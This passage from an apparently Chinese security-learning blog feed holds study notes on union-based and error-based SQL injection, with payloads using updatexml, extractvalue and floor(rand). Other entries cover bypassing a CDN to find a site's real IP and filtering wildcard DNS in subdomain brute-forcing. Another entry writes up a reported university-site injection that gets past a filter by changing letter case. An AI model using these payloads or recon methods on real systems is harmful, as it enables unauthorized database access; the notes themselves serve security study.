n：为查询结果返回的数量<br>如果想查询的字段比union前面固定的字段要多，就要使用concat来合并：<br>‘ union select password, concat(first_name,’ ‘,last_name,’ ‘,user) from users –+ </p><h2 id="3-解答"><a href="#3-解答" class="headerlink" title="3 解答"></a>3 解答</h2><p>① 为什么是select 1，2 不是 select 1，2，3？<br>union：同时执行两条查询语句。所以必须保证两条查询语句的列数保持一致。这也是为什么我们要先确定列数，才能继续union注入。</p><p>select id,username,password from user union select 1,2,3;<br>② –+  #  %23代表什么？<br>– （注意–后面带一个空格），#代表注释，%23是#的url编码形式，因此等同。<br>由于在传输过程中空格会被忽略，同样导致无法注释，所以用+代替空格。<br>为了注释后面的语句使得sql语句提前闭合，所以需要加入注释符号。<br>③ information_schema是什么？（待补充细节）<br>information_schema数据库是MySQL自带的，它提供了访问数据库元数据的方式。元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。</p><p>table_name：表的名称   </p><p>information_schema.tables 获取所有数据库</p><p>column_name：列的名称 </p><p>information_schema.columns</p><p>information_schema.schemata：mysql实例中所有数据库的信息。</p><p>show databases的结果取于此表。</p><p>④  如何快速查找某个网站存在的sql注入点呢？<br>可以参考 github项目：<br><a href="https://github.com/ianxtianxt/SleuthQL">https://github.com/ianxtianxt/SleuthQL</a> </p><p>我们之后的文章也探讨下这个问题。</p><h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4 总结"></a>4 总结</h2><p>本篇我们讲解了sql注入漏洞的联合注入，基于Union的注入关键词有：有显示位，查询列数需要相同，要判断列数。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.haochen1204.com/2021/03/21/sql-zhu-ru-zhi-lian-he-zhu-ru/">https://www.haochen1204.com/2021/03/21/sql-zhu-ru-zhi-lian-he-zhu-ru/</a></p><p><a href="https://cloud.tencent.com/developer/article/2088168">https://cloud.tencent.com/developer/article/2088168</a></p><p><a href="https://cloud.tencent.com/developer/article/1196791">https://cloud.tencent.com/developer/article/1196791</a></p><p><a href="https://github.com/ianxtianxt/SleuthQL">https://github.com/ianxtianxt/SleuthQL</a></p><p><a href="https://blog.csdn.net/hxhxhxhxx/article/details/107643024?spm=1001.2014.3001.5506">https://blog.csdn.net/hxhxhxhxx/article/details/107643024?spm=1001.2014.3001.5506</a></p><p>声明：本Web安全基础推文系列旨在以平白的语言讲解漏洞原理，文章多数内容为我本人的学习笔记与总结，汇总供大家参考。所有内容仅作为学习记录。请遵守中华人民共和国法律！</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试，SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【Sql注入】报错注入</title>
    <link href="/2023/04/21/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/04/21/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<div class="note note-info">            <p>本Web安全基础推文系列旨在以平白的语言讲解漏洞原理，文章多数内容为我本人的学习笔记与总结，汇总供大家参考。</p>          </div><h1 id="sql注入漏洞概述"><a href="#sql注入漏洞概述" class="headerlink" title="sql注入漏洞概述"></a>sql注入漏洞概述</h1><p>本篇我们即将开启Web安全基础学习之旅，从我所整理的笔记中梳理常见Web漏洞的诸多知识点，包括漏洞原理，分类，利用场景及手段，渗透测试步骤，防御措施及常用工具等多个角度。本Web安全基础推文系列旨在以平白的语言讲解漏洞原理，文章多数内容为我本人的学习笔记与总结，汇总供大家参考。<br>首先，sql注入原理：存在输入口，使得用户输入的恶意sql语句拼接到正常语句中被后台执行。</p><h2 id="1-漏洞分类"><a href="#1-漏洞分类" class="headerlink" title="1 漏洞分类"></a>1 漏洞分类</h2><h3 id="1-1-按参数类型分类"><a href="#1-1-按参数类型分类" class="headerlink" title="1.1 按参数类型分类"></a>1.1 按参数类型分类</h3><p>SQL语句注入点的参数类型有数字型和字符型，如下：<br>1)数字型注入:SELECT * FROM users WHERE id=$id<br>参数$id为整型，即数字型。举例报错注入情况下，由payload：?id=1 and 1=1/?id=1 and 1=2，由于and 1=1使得整个逻辑表达式结果为1，and 1=2结果为0，这两种拼接的结果不同，势必会使页面有不同的回显，因此可以用来验证是否存在注入点。</p><p>2)字符型注入:SELECT * FROM users WHERE id=’$id’<br>参数’$id’为string类型， 如sqli-lab-Less-1  此时?id=1’ 发现报错，爆数据库名和mysql版本payload为：?id=1’ union select 1,database(),version()–+</p><h3 id="1-2-按注入方式分类"><a href="#1-2-按注入方式分类" class="headerlink" title="1.2 按注入方式分类"></a>1.2 按注入方式分类</h3><p>大致可以分为：报错注入，盲注，联合注入，HTTP注入，二次注入，堆叠注入，宽字节注入这几种。<br>报错注入<br>由于Mysql在执行语句的时候会抛出异常信息，而php+mysql架构的网站往往又将错误代码显示在页面，因此攻击者可以利用这一点从报错信息中获取数据库的私密数据。这种注入行为称为“报错注入”。报错注入是注入页面可显示数据库报错结果的情况下，利用函数报错使其输出错误结果来获取数据库的相关信息的一种sql注入类型。</p><p>1）数据类型溢出<br>当数值超出某个类型的最大范围时就会溢出报错。exp函数就会产生类似的溢出错误</p><p>mysql&gt; select ~0;<br>+———————-+<br>| ~0                   |<br>+———————-+<br>| 18446744073709551615 |<br>+———————-+<br>1 row in set (0.00 sec)</p><p>mysql&gt; select <del>0+1;<br>ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in ‘(</del>(0) + 1)’</p><p>mysql&gt; select exp(710);</p><p>ERROR 1690 (22003): DOUBLE value is out of range in ‘exp(710)’</p><p>利用姿势<br>mysql&gt; select exp(<del>(select*from(select user())x));<br>ERROR 1690 (22003): DOUBLE value is out of range in ‘exp(</del>((select ‘root@localhost’ from dual)))’<br>这里的x是把user()取名为x的意思<br>2）xpath语法错误<br>利用xpath语法错误来进行报错注入主要利用extractvalue和updatexml两个函数。<br>extractvalue负责在xml文档中按照xpath语法查询节点内容，updatexml则负责修改查询到的内容<br>extractvalue<br>函数原型：extractvalue(xml_document,Xpath_string);<br>正常语法：extractvalue(xml_document,Xpath_string);<br>第一个参数：xml_document是string格式，为xml文档对象的名称<br>第二个参数：Xpath_string是xpath格式的字符串<br>作用：从目标xml中返回包含所查询值的字符串<br>updatexml<br> 函数原型：updatexml(xml_document,xpath_string,new_value)<br>第一个参数：xml_document是string格式，为xml文档对象的名称<br>第二个参数：xpath_string是xpath格式的字符串<br>第三个参数：new_value是string格式，替换查找到的负荷条件的数据<br>作用：改变文档中符合条件的节点的值<br>利用姿势<br>mysql&gt; select updatexml(1,concat(0x7e,(select @@version),0x7e),1);<br>ERROR 1105 (HY000): XPATH syntax error: ‘<del>5.7.17</del>‘<br>mysql&gt; select extractvalue(1,concat(0x7e,(select @@version),0x7e));<br>ERROR 1105 (HY000): XPATH syntax error: ‘<del>5.7.17</del>‘<br>3）主键重复错误<br>count()+rand()+group by导致主键重复，count()和group by在遇到rand()产生的重复值时报错<br>我们基于sql语句：Select count(*) from test group by floor(rand(0)*2)，查看下面的分析：</p><p>原理：group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表的数据；如果key不在临时表中，则在临时表中插入key所在行的数据。</p><p>而rand(0)是个稳定的序列，floor(rand(0)<em>2)则会固定得到011011…的序列，插入的时候就会报主键重复的错误。<br>利用姿势<br>mysql&gt; select count(</em>) from test group by concat(version(),floor(rand(0)<em>2));<br>ERROR 1062 (23000): Duplicate entry ‘5.7.171’ for key ‘<group_key>‘<br>mysql&gt; select count(</em>),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x;<br>ERROR 1062 (23000): Duplicate entry ‘5.7.171’ for key ‘<group_key>‘<br>4）列名重复报错<br>mysql列名重复会报错，可以利用name_const（const）来制造一个列：</p><p>mysql&gt; select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;<br>ERROR 1060 (42S21): Duplicate column name ‘5.7.17’<br>mysql&gt; select *  from(select * from test a join test b)c;<br>ERROR 1060 (42S21): Duplicate column name ‘id’<br>mysql&gt; select *  from(select * from test a join test b using(id))c;<br>ERROR 1060 (42S21): Duplicate column name ‘name’<br>5）几何函数报错</p><p>mysql有些几何函数，例如geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring()，这些函数对参数要求是形如(1 2,3 3,2 2 1)这样几何数据，如果不满足要求，则会报错。经测试，在版本号为5.5.47上可以用来注入，而在5.7.17上则不行。</p><h2 id="2-注入步骤及漏洞利用"><a href="#2-注入步骤及漏洞利用" class="headerlink" title="2 注入步骤及漏洞利用"></a>2 注入步骤及漏洞利用</h2><p>① 找注入点</p><p>② 判断注入类型</p><p>③ 判断是整型还是字符型</p><p>④ 判断查询列数</p><p>⑤ 判断显示位</p><p>⑥ 获取所有数据库名</p><p>⑦ 获取表名</p><p>⑧ 获取列名</p><p>⑨ 获取列中信息</p><h2 id="3-常用函数说明"><a href="#3-常用函数说明" class="headerlink" title="3 常用函数说明"></a>3 常用函数说明</h2><p>① 0x7e=’<del>’<br>② concat(‘a’,‘b’)=“ab” 起到连接两个字符的作用；<br>③ version()等同于@@version<br>④ ‘</del>‘可以换成’#’、’$’等不满足xpath格式的字符<br>⑤ extractvalue()能查询字符串的最大长度为32，如果我们想要的结果超过32，就要用substring()函数截取或limit分页，一次查看最多32位<br>extractvalue(xml_document,Xpath_string) 两个参数<br>updatexml(xml_document,xpath_string,new_value) 有三个参数<br>一般在其参数里用concat() 去拼接更多内容报错<br>⑥ sql语句最后–+ 和# 是为了使语句闭合引入注释，使得sql语句提前闭合，成功注入我们的语句</p><h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4 总结"></a>4 总结</h2><p>上两篇文章中我们总结了两个信息搜集过程常遇到的问题：CDN绕过和泛域名解析，本篇我们讲解了sql注入漏洞的报错注入类型，其中关于主键重复报错的细节我建议至参考链接查看。下期我们可能会讲解一些计算机网络基础，并继续整理sql注入的知识点。<br>最后闲聊几句，最近开始海投简历面试，希望暑假前能找到实习，忽然又开始做起了大厂梦，又开始有了peer pressure。<br>记得微博网友有句话说的蛮好：焦虑没有用，做才有用。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>声明：本Web安全基础推文系列旨在以平白的语言讲解漏洞原理，文章多数内容为我本人的学习笔记与总结，汇总供大家参考。所有内容仅作为学习记录。请遵守中华人民共和国法律！</p><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://xz.aliyun.com/t/253">https://xz.aliyun.com/t/253</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="https://cloud.tencent.com/developer/article/2169033">https://cloud.tencent.com/developer/article/2169033</a><a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试，SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【信息搜集】绕过CDN寻找真实IP</title>
    <link href="/2023/03/29/%E7%BB%95%E8%BF%87CDN%E5%AF%BB%E6%89%BE%E7%9C%9F%E5%AE%9EIP/"/>
    <url>/2023/03/29/%E7%BB%95%E8%BF%87CDN%E5%AF%BB%E6%89%BE%E7%9C%9F%E5%AE%9EIP/</url>
    
    <content type="html"><![CDATA[<p>渗透测试过程中，信息搜集是很重要的准备步骤。而信息搜集大致有域名搜集，C段及旁站扫描，指纹识别，端口扫描，目录扫描等。</p><p>其中域名搜集又分为一级域名和子域名搜集。上一篇文章我们讲解了子域名搜集过程遇到的泛解析问题，爆破得到的子域名可能会泛解析到同个IP。于是通过IP黑名单的方式，达到过滤冗余子域名的效果。本篇博客我们集中于解决域名搜集过程中，如何绕过CDN寻找真实IP的问题。</p><h2 id="1-前景知识"><a href="#1-前景知识" class="headerlink" title="1 前景知识"></a>1 前景知识</h2><p>通常来讲，通过cmd的ping或者nslookup命令，即能快速找到域名对应IP。但很多站点出于用户体验和安全的角度，使用CDN加速，将域名解析到CDN，这时候就需要绕过CDN来查找真实IP。那么什么是CDN？<br>CDN全称为Content Delivery Network-内容分发网络。简单理解，资源服务器比作快递发货店家，CDN节点即为各个快递网点。快递网点会寄存一些店家的库存以方便快速发货到用户手中。这种分包的概念即为CDN的核心思想：用户请求资源时，就近返回节点上缓存的资源，而不需要每个用户的请求都回源站获取，避免网络拥塞。</p><h2 id="2-如何判断是否使用了CDN？"><a href="#2-如何判断是否使用了CDN？" class="headerlink" title="2 如何判断是否使用了CDN？"></a>2 如何判断是否使用了CDN？</h2><ol><li>多地 ping </li></ol><p>查看对应 IP 地址是否唯一，如果不唯一多半是使用了CDN， 多地 Ping 网站有：<a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a> ，<a href="http://ping.aizhan.com/">http://ping.aizhan.com/</a> , <a href="http://ce.cloud.360.cn/">http://ce.cloud.360.cn/</a></p><ol start="2"><li>查询DNS记录-使用 nslookup 进行检测</li></ol><p>nslookup-name server lookup 用于查询DNS服务器上某域名的DNS记录。如下，我们nslookup <a href="http://www.163.com/">www.163.com</a> ，本地DNS服务器返回了多个地址</p><p>图片</p><p>第一部分：<br>这里是我们本机的DNS服务器信息。<br>第二部分：<br>非权威应答对应的英文是：Non-authoritative answer。什么叫非权威应答？假设某个DNS server没有域名test.com的记录信息，当有客户端通过它请求获取test.com的域名信息，此DNS Server会通过迭代递归的方式从test公司实际存储此记录信息的DNS server中获取test.com的域名信息，反馈给发出请求的客户端，同时会把test.com的记录信息放在自身缓存中放置一段时间，当又有客户端请求test.com域名解析时，此DNS server直接从自身缓存中提取返回给客户端，这个回答叫“非权威回答”，简言之凡是从非实际记录存储DNS server中获取的域名解析回答，都叫“非权威回答”。<br>Name:z163picipv6.v.bsgslb.cn 指的 <a href="http://www.163.com/">www.163.com</a> 域名实际对应的主机名记录。<br>第三部分：<br>Address有多个记录， 说明该域名实际对应多个物理主机，用户访问<a href="http://www.163.com时,按照一定规则由其中一台计算机进行应答.(cnd的作用)/">www.163.com时，按照一定规则由其中一台计算机进行应答。（CND的作用）</a><br>Aliase: DNS记录中的一个别名，方便我们记忆。</p><h2 id="3-Solution"><a href="#3-Solution" class="headerlink" title="3 Solution"></a>3 Solution</h2><ol><li>查询DNS历史记录<br>查询域名的NS记录、MX记录、TXT记录等很有可能指向的是真实ip或同C段服务器。除了过去的DNS记录，即使是当前的记录也可能泄漏原始服务器IP。例如，MX记录是一种常见的查找IP的方式。如果网站在与web相同的服务器和IP上托管自己的邮件服务器，那么原始服务器IP将在MX记录中。<br>图片</li></ol><p>DNS记录类型分为A,CNAME,NS和MX</p><p>图片</p><p>可以用 <a href="https://www.ip138.com/">https://www.ip138.com/</a> 查询域名历史解析记录 </p><ol start="2"><li>查询子域名</li></ol><p>毕竟 CDN 还是不便宜的，所以很多站长可能只会对主站或者流量大的子站点做了 CDN，而很多小站子站点又跟主站在同一台服务器或者同一个C段内，此时就可以通过查询子域名对应的 IP 来辅助查找网站的真实IP。<br>各种工具用于子域名爆破：Layer，Oneforall</p><ol start="3"><li>利用SSL证书寻找真实原始IP<br>在censy上进行搜索，语法：parsed.names: xxxx.com and tags.raw: trusted</li></ol><p>4.Http头<br>利用HTTP标头寻找真实原始IP</p><p>5.邮件测试<br>一般的邮件系统都在内部，没有经过CDN的解析，通过目标网站用户注册或者RSS订阅功能，查看邮件，寻找邮件头中的邮件服务器域名IP，ping这个邮件服务器的域名，就可以获得目标的真实IP(必须是目标自己的邮件服务器，第三方或者公共邮件服务器是没有用的）</p><p>6.国外地址请求<br>国内很多 CDN 厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的主机直接访问可能就能获取到真实IP</p><ol start="7"><li><p>网站敏感文件泄露，例如：Phpinfo 其中有Server IP信息</p></li><li><p>F5 LTM解码法（这个方法我不是很理解，但还是贴出来）<br>当服务器使用F5 LTM做负载均衡时，通过对set-cookie关键字的解码真实ip也可被获取，例如：Set-Cookie: BIGipServerpool_8.29_8030=487098378.24095.0000，先把第一小节的十进制数即487098378取出来，然后将其转为十六进制数1d08880a，接着从后至前，以此取四位数出来，也就是0a.88.08.1d，最后依次把他们转为十进制数10.136.8.29，也就是最后的真实ip。</p></li></ol><h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4 总结"></a>4 总结</h2><p>本篇博客核心介绍了CDN，DNS的概念以及nslookup这一工具的简易使用。还有其他绕过CDN的方法我们没有涉及，比如利用Fofa或者Shodan网络空间搜索引擎，这些工具我之前在【粗心程序员，后台惨遭删库勒索 】这篇文章有用到过，感兴趣的小伙伴可以去看看。知识靠积累，目前先总结如上信息。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://blog.csdn.net/qq_60848021/article/details/128742979">https://blog.csdn.net/qq_60848021/article/details/128742979</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="https://blog.csdn.net/Hacker_Q/article/details/113937586">https://blog.csdn.net/Hacker_Q/article/details/113937586</a><a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:3" class="footnote-text"><span><a href="https://blog.csdn.net/jklbnm12/article/details/122952255?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0-122952255-blog-113937586.235%5Ev27%5Epc_relevant_recovery_v2&amp;spm=1001.2101.3001.4242.1&amp;utm_relevant_index=3">https://blog.csdn.net/jklbnm12/article/details/122952255?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0-122952255-blog-113937586.235^v27^pc_relevant_recovery_v2&amp;spm=1001.2101.3001.4242.1&amp;utm_relevant_index=3</a><a href="#fnref:3" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:4" class="footnote-text"><span><a href="https://www.cnblogs.com/ghj1976/p/3380477.html">https://www.cnblogs.com/ghj1976/p/3380477.html</a><a href="#fnref:4" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试，信息搜集，子域名爆破</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【信息搜集】子域名爆破的泛解析问题</title>
    <link href="/2023/03/28/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%B3%9B%E8%A7%A3%E6%9E%90/"/>
    <url>/2023/03/28/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%B3%9B%E8%A7%A3%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<div class="note note-info">            <p>本Web安全基础推文系列旨在以平白的语言讲解漏洞原理，文章多数内容为我本人的学习笔记与总结，汇总供大家参考。</p>          </div><h2 id="1-什么是泛解析？"><a href="#1-什么是泛解析？" class="headerlink" title="1 什么是泛解析？"></a>1 什么是泛解析？</h2><p>在子域名解析中，每个子域名都会解析为一个特定的IP地址。只有被设置解析，用户才能正常进行访问。一旦用户输入错误的子域名，就会造成无法访问。<br><img src="/img/baidu.png"><br>在网站运营中，域名持有者为了避免因为错误输入，而造成用户流失，就会使用泛域名解析。比如用户输入123.baidu.com，能正常访问到<a href="http://www.baidu.com./">www.baidu.com。</a><br>泛域名解析是一种特殊的域名解析方式。它使用通配符形式，设置域名解析。它可以将没有明确设置的子域名一律解析到一个IP地址上。这样，即使用户输入错误的子域名，也可以访问到域名持有者指定的IP地址。<br>通过过cmd命令行，ping该站点，确实印证了域名不同却指向了同个ip。<br><img src="/img/CDNbaidu.png"><br>此处还有一个知识点，即CDN的存在，a.shifen.com（CDN我们下篇文章解释)</p><h2 id="2-如何判断是否开启了泛解析？"><a href="#2-如何判断是否开启了泛解析？" class="headerlink" title="2 如何判断是否开启了泛解析？"></a>2 如何判断是否开启了泛解析？</h2><p>输入一个“模糊”域名，确定能正确解析，则说明该站点开启了泛解析。<br>比如打开cmd，ping一个站点，输入的是 w<a href="http://www.baiud.com.很明显,这个输入多了一个w,与正常的域名不符,但ping该域名过程却能正常返回ip地址,说明该站点开启了域名泛解析./">www.baiud.com。很明显，这个输入多了一个w，与正常的域名不符，但ping该域名过程却能正常返回ip地址，说明该站点开启了域名泛解析。</a></p><h2 id="3-Solution：IP-黑名单"><a href="#3-Solution：IP-黑名单" class="headerlink" title="3 Solution：IP 黑名单"></a>3 Solution：IP 黑名单</h2><p>目前最常见的解决方式是IP黑名单的方式。<br>首先访问一个随机的并不存在的域，通过返回的结果判断是否存在泛解析。确定存在泛解析后，（脚本实现）不断地生成随机域名并发送请求，将每次返回的IP和TTL记录下来，直到大部分的IP出现次数都大于两次，则IP黑名单收集完成。<br>而后使用域名字典进行爆破，爆破过程中根据IP黑名单进行过滤，同时比较TTL，在泛解析记录中TTL是相同的，如果TTL不相同，则不是泛解析记录。<br>这样就成功地过滤了那些爆破之后存在的泛解析域名。</p><h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4 总结"></a>4 总结</h2><p>最近也是疯狂让自己忙起来的状态，很多事情搞得自己不开心。</p><p>Anyway, Suffering still persists, but blossoms too can’t resist. </p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://blog.csdn.net/Chu_Jian_Xiong/article/details/127496889">https://blog.csdn.net/Chu_Jian_Xiong/article/details/127496889</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试，信息搜集，子域名爆破</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【智能合约】学习笔记（一）</title>
    <link href="/2023/03/07/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/"/>
    <url>/2023/03/07/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<h1 id="智能合约Solidity入门"><a href="#智能合约Solidity入门" class="headerlink" title="智能合约Solidity入门"></a>智能合约Solidity入门</h1><p><img src="/img/ContractMap.png"></p><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>int<br>uint 无符号整型 多少位？256？<br>struct<br>mapping<br>string<br>address</p><h2 id="存储"><a href="#存储" class="headerlink" title="存储"></a>存储</h2><p>storage<br>memory</p><h2 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h2><p>pure<br>view<br>private</p><p>public</p><h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>paragm solidity ^0.8.17</p><h2 id="函数（构造器，修饰器）"><a href="#函数（构造器，修饰器）" class="headerlink" title="函数（构造器，修饰器）"></a>函数（构造器，修饰器）</h2><p>constructor<br>modifier</p><h2 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h2><p>require<br>assert</p><h2 id="事件event"><a href="#事件event" class="headerlink" title="事件event"></a>事件event</h2><h2 id="GAS消耗优化"><a href="#GAS消耗优化" class="headerlink" title="GAS消耗优化"></a>GAS消耗优化</h2><h2 id="生命周期"><a href="#生命周期" class="headerlink" title="生命周期"></a>生命周期</h2>]]></content>
    
    
    <categories>
      
      <category>区块链</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Blockchain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【操作系统】常见命令总结</title>
    <link href="/2022/11/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/"/>
    <url>/2022/11/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="Unix类-kali-ubuntu"><a href="#Unix类-kali-ubuntu" class="headerlink" title="Unix类 kali ubuntu"></a>Unix类 kali ubuntu</h2><p>sudo su</p><p>ifconfig</p><p>who</p><p>whoami</p><p>cat /etc/passwd</p><p>cat /etc/gruop</p><p><a href="https://www.cnblogs.com/summer1019/p/11162782.html">https://www.cnblogs.com/summer1019/p/11162782.html</a></p><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p>如何查看当前用户及权限<br>net users</p><p>minc<br>useraccounts</p><p>whoami<br>如何查看网络地址和主机等<br>ipconfig</p>]]></content>
    
    
    <categories>
      
      <category>计算机基础知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>记一次edusrc的sql注入漏洞挖掘</title>
    <link href="/2022/11/14/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    <url>/2022/11/14/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</url>
    
    <content type="html"><![CDATA[<h1 id="某大学网站存在sql注入"><a href="#某大学网站存在sql注入" class="headerlink" title="某大学网站存在sql注入"></a>某大学网站存在sql注入</h1><p>该系统存在sql注入漏洞，特征为：desc关键字后, 命令大小写绕过注入</p><h2 id="0x01-注册"><a href="#0x01-注册" class="headerlink" title="0x01 注册"></a>0x01 注册</h2><p>首先打开站点：<a href="https://xxx.edu.cn/xx/index">https://xxx.edu.cn/xx/index</a></p><p><img src="/img/2022122901.png"></p><p>首先进入网页，右上角是一个登录注册界面，尝试用虚拟邮箱进行注册</p><p><img src="/img/2022122902.png"></p><p>这里我随便使用临时邮箱进行注册，注册过程出现激活邮件<br><img src="/img/2022122903.png"></p><p>到邮箱中进行激活，至此注册成功。</p><p><img src="/img/2022122904.png"></p><h2 id="0x02-寻找注入点"><a href="#0x02-寻找注入点" class="headerlink" title="0x02 寻找注入点"></a>0x02 寻找注入点</h2><p>点开各个界面，发现有申请界面有查询框，尝试寻找注入点。</p><p><img src="/img/2022122905.png"></p><p>此步开始，打开firefox的浏览器代理到burpsuite，由burp进行监听。</p><p>在申请界面发现有表单界面：</p><p><img src="/img/2022122906.png"></p><p>任意选择条件后提交后查看burp抓到的数据包，我是选择了学院条件后查看。查看burp抓到的数据包列表，发现有POST包，其中两个POST包均存在参数。</p><p><img src="/img/2022122907.png"></p><p>说明刚刚选择的学院条件被提交到后台数据库，</p><p>点开任意一个POST包，发现存在sql语句关键字desc。图片较为模糊，已做马赛克处理，大致意思理解即可。于是，将该数据包send to repeater进行payload构造，发现没有waf，如果有可以尝试绕过一下。</p><p><img src="/img/2022122908.png"></p><p><img src="/img/2022122909.png"></p><p>尝试修改desc为desca，发送之后出现报错。</p><p><img src="/img/2022122910.png"></p><p>爆出sql查询语句，表名列名等；确认为注入点。</p><h2 id="0x03-构造payload"><a href="#0x03-构造payload" class="headerlink" title="0x03 构造payload"></a>0x03 构造payload</h2><p>尝试各类字符串注入，发现有滤过。</p><p>构造payload为：desc.exp(1)  和 desc,,updatexml(1,concat(0x01,user()),1)</p><p>发现被后台滤过，出现非法操作的响应</p><p><img src="/img/2022122911.png"></p><p>尝试修改updatexml语句中的大小写，修改payload为desc,updateXMl(1,concAt(0x01,user()),1)</p><p><img src="/img/2022122912.png"></p><p>发现成功注入。</p><p>同理构造payload：desc,updateXMl(1,concAt(0x01,database()),1)</p><p>desc,updateXMl(1,concAt(0x01,version()),1)，爆出数据库名和数据库版本。</p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>至此该漏洞验证,使用抓包工具为Burpsuite。属于desc关键字处存在POST型sql注入，且通过大小写绕过实现注入。updatexml和concat二者必须同时满足有大写字母存在，才能实现绕过。</p><p>声明：文中所包含漏洞均已提交edusrc且以修复，所有内容均已脱敏，仅作为学习记录。由于查看本文章造成的任何后果本团队不承担任何责任，请遵守中华人民共和国法律！</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试，SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS注入：从0到1</title>
    <link href="/2022/11/14/XSS%E6%B3%A8%E5%85%A5%EF%BC%9A%E4%BB%8E0%E5%88%B01/"/>
    <url>/2022/11/14/XSS%E6%B3%A8%E5%85%A5%EF%BC%9A%E4%BB%8E0%E5%88%B01/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试，XSS注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【渗透测试】信息搜集（一）</title>
    <link href="/2022/11/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%EF%BC%88%E4%B8%80%EF%BC%89/"/>
